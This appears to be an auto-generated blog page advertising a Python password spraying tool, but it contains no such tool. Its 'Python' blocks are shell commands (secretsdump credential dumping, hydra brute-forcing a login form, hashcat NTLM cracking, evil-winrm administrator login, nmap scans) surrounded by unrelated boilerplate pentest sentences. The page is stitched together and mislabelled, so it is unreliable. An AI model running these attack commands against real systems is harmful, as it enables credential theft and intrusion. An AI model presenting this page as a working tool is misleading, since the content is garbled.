---
TitleSEO: "Password Spraying Tool in Python | ZureFX"
TitlePost: "Password Spraying Tool — Python"
Author: "ZureFX"
Description: "A Python script for password spraying tool. Built for security research and automation."
Keywords: "fuzzer, tool, script, go, python"
URL: "https://zurefx.github.io/scripting/script-password-spraying-tool-755.html"
URL_IMAGES: ""
Date: "2025-01-29"
Tags: "Fuzzer, Tool, Script, Go, Python"
Section: "scripting"
Lang: "en"
main_img: "script-password-spraying-tool-755"
Permalink: "/scripting/script-password-spraying-tool-755.html"
BtnLabel: "View Script"
Pick: 0
---
## Overview

### Description

Command injection was possible through unsanitized user input in the search functionality. The backup files contained sensitive information that should not have been accessible. Network traffic analysis revealed unencrypted communications containing user credentials.

Built with **Python** for offensive security automation.

### Requirements

- Python
- `bloodhound`
- `smbclient`
- `psexec`

## Implementation

### Core Logic

Privilege escalation was possible due to misconfigured sudo permissions. Authentication bypass was achieved through careful manipulation of the login mechanism.

```python
impacket-secretsdump administrator:'P@ssw0rd!'@10.120.34.19
nmap -sCV -p80,80,27017 10.39.207.5 -oN scan.txt
nmap -sCV -p5986,80,1433 10.53.100.149 -oN scan.txt
feroxbuster -h
```

The scheduled task ran with elevated privileges and could be abused for escalation. The target system was identified as running a vulnerable version of the service.

### Helper Functions

The web application was vulnerable to Server-Side Template Injection (SSTI). The database credentials were hardcoded in the application source code.

```python
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.50.43.106 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
feroxbuster -h
```

## Usage

### Basic Usage

Initial enumeration revealed several interesting open ports on the target. The target system was identified as running a vulnerable version of the service.

```bash
nmap -sCV -p8888,443,80 10.54.160.24 -oN scan.txt
```

### Advanced Options

Unconstrained delegation was enabled on the compromised machine. Post-exploitation enumeration revealed a path to domain administrator privileges. Command injection was possible through unsanitized user input in the search functionality.

```bash
evil-winrm -i 10.11.44.212 -u administrator -p 'P@ssw0rd!'
```

## Output

### Example Output

The web application was vulnerable to Server-Side Template Injection (SSTI). The database credentials were hardcoded in the application source code.

```
[+] Scanning target...
[+] Found 2 results
[+] Done in 23.71s
```
